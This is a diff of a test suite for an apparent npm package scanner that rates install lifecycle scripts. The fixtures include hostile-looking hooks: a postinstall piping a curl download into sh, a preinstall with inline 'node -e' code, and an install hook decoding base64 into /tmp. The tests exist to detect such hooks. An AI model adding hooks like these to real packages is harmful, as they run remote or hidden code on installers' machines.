@@ -78,6 +78,49 @@ describe('an install lifecycle script', () => {
     expect(finding.severity).toBe('medium')
     expect(finding.detail).toContain('allowBuilds')
   })
+
+  it('stays medium when the command runs a file the package shipped', async () => {
+    // Every hook in the pinned corpus is this: `tsdown`, `npm run build`,
+    // `husky`, `node scripts/prepare.mjs`. Five of forty legitimate packages
+    // declare one, so the category alone cannot carry a high.
+    const report = await inspect(createPackage({
+      'package.json': JSON.stringify({ name: 'builds', version: '1.0.0', scripts: { prepare: 'node scripts/prepare.mjs' } }),
+    }))
+    expect(onlyCheck(report, 'A1').severity).toBe('medium')
+  })
+
+  it('is high when the command line is the attack, and says which part of it is', async () => {
+    const report = await inspect(createPackage({
+      'package.json': JSON.stringify({
+        name: 'fetches', version: '1.0.0',
+        scripts: { postinstall: 'curl -s https://cdn.example.test/p.sh | sh' },
+      }),
+    }))
+    const finding = onlyCheck(report, 'A1')
+    expect(finding.severity).toBe('high')
+    expect(finding.detail).toContain('fetches a remote resource at install time')
+    expect(finding.detail).toContain('pipes its input straight into a shell')
+  })
+
+  it('is high when the command evaluates code no published file records', async () => {
+    const report = await inspect(createPackage({
+      'package.json': JSON.stringify({
+        name: 'evaluates', version: '1.0.0',
+        scripts: { preinstall: 'node -e "require(\'os\').homedir()"' },
+      }),
+    }))
+    expect(onlyCheck(report, 'A1').severity).toBe('high')
+  })
+
+  it('is high when the command decodes its own payload', async () => {
+    const report = await inspect(createPackage({
+      'package.json': JSON.stringify({
+        name: 'decodes', version: '1.0.0',
+        scripts: { install: 'echo aGVsbG8= | base64 --decode > /tmp/x' },
+      }),
+    }))
+    expect(onlyCheck(report, 'A1').severity).toBe('high')
+  })
 })
 
 describe('a shipped skill hiding bytes in variation selectors', () => {
